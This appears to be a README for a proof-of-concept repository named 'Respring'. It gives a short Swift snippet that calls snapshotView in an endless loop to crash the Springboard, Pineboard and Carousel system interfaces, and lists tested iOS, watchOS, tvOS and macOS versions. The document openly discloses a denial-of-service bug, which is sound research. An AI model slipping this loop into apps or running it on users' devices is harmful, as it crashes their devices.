# Respring
## Proof of concept code to crash Springboard/Pineboard/Carousel 

Tested on iOS 15.0, 14.3, 13.3,
          watchOS 7.5, 8.0
          tvOS 14.3
          macOS 11.1, 12.0

To cause the crash run the following code
```swift
guard let window = UIApplication.shared.windows.first else { return }
while true {
   window.snapshotView(afterScreenUpdates: false)
}
```
